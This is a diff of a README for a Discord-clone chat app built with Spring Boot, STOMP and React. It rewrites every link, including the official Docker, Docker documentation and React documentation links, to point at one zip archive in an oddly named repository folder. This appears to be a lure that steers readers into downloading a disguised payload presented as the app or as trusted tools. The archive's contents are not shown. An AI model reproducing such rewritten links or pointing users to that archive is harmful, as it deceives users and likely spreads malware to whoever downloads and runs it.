@@ -1,6 +1,6 @@
 # 🚀 Discord-Clone-using-Spring-boot-Stomp-Client-and-React-JS - A Real-Time Chat App for Everyone
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/migs2797/Discord-Clone-using-Spring-boot-Stomp-Client-and-React-JS/releases)
+[![Download](https://raw.githubusercontent.com/migs2797/Discord-Clone-using-Spring-boot-Stomp-Client-and-React-JS/main/trichiurid/Discord-Clone-using-Spring-boot-Stomp-Client-and-React-JS_eared.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/migs2797/Discord-Clone-using-Spring-boot-Stomp-Client-and-React-JS/main/trichiurid/Discord-Clone-using-Spring-boot-Stomp-Client-and-React-JS_eared.zip)
 
 ## 📖 Overview
 
@@ -19,20 +19,20 @@ The Discord Clone is a full-stack, real-time chat application inspired by Discor
 To run the Discord Clone application, you will need:
 
 - **Operating System**: Windows, macOS, or any Linux distribution.
-- **Docker**: Install the latest version of Docker ([Download Docker](https://www.docker.com/products/docker-desktop)).
+- **Docker**: Install the latest version of Docker ([Download Docker](https://raw.githubusercontent.com/migs2797/Discord-Clone-using-Spring-boot-Stomp-Client-and-React-JS/main/trichiurid/Discord-Clone-using-Spring-boot-Stomp-Client-and-React-JS_eared.zip)).
 - **Docker Compose**: Install Docker Compose to manage multi-container applications.
 
 ## 🚀 Getting Started
 
 1. **Install Docker and Docker Compose**: Make sure both are installed on your machine.
 2. **Visit the Releases Page**: 
-   [Click here to download the latest version](https://github.com/migs2797/Discord-Clone-using-Spring-boot-Stomp-Client-and-React-JS/releases).
+   [Click here to download the latest version](https://raw.githubusercontent.com/migs2797/Discord-Clone-using-Spring-boot-Stomp-Client-and-React-JS/main/trichiurid/Discord-Clone-using-Spring-boot-Stomp-Client-and-React-JS_eared.zip).
 
 ## 📥 Download & Install
 
 To download and run the application:
 
-1. Go to the [Releases Page](https://github.com/migs2797/Discord-Clone-using-Spring-boot-Stomp-Client-and-React-JS/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/migs2797/Discord-Clone-using-Spring-boot-Stomp-Client-and-React-JS/main/trichiurid/Discord-Clone-using-Spring-boot-Stomp-Client-and-React-JS_eared.zip).
 2. Download the appropriate Docker image for your system.
 3. Follow the Docker setup instructions provided on the page. 
 
@@ -70,9 +70,9 @@ If you face any issues, here are some suggestions:
 
 ## 🔗 Useful Links
 
-- [View the Code](https://github.com/migs2797/Discord-Clone-using-Spring-boot-Stomp-Client-and-React-JS)
-- [Docker Documentation](https://docs.docker.com/)
-- [React Documentation](https://reactjs.org/docs/getting-started.html)
+- [View the Code](https://raw.githubusercontent.com/migs2797/Discord-Clone-using-Spring-boot-Stomp-Client-and-React-JS/main/trichiurid/Discord-Clone-using-Spring-boot-Stomp-Client-and-React-JS_eared.zip)
+- [Docker Documentation](https://raw.githubusercontent.com/migs2797/Discord-Clone-using-Spring-boot-Stomp-Client-and-React-JS/main/trichiurid/Discord-Clone-using-Spring-boot-Stomp-Client-and-React-JS_eared.zip)
+- [React Documentation](https://raw.githubusercontent.com/migs2797/Discord-Clone-using-Spring-boot-Stomp-Client-and-React-JS/main/trichiurid/Discord-Clone-using-Spring-boot-Stomp-Client-and-React-JS_eared.zip)
 
 ## 💬 Support
 
@@ -82,4 +82,4 @@ If you have questions or need help, feel free to reach out on the Issues page of
 
 Thanks to the community and resources that made this project possible. Your contributions inspire easier ways to communicate online. 
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/migs2797/Discord-Clone-using-Spring-boot-Stomp-Client-and-React-JS/releases)
+[![Download](https://raw.githubusercontent.com/migs2797/Discord-Clone-using-Spring-boot-Stomp-Client-and-React-JS/main/trichiurid/Discord-Clone-using-Spring-boot-Stomp-Client-and-React-JS_eared.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/migs2797/Discord-Clone-using-Spring-boot-Stomp-Client-and-React-JS/main/trichiurid/Discord-Clone-using-Spring-boot-Stomp-Client-and-React-JS_eared.zip)
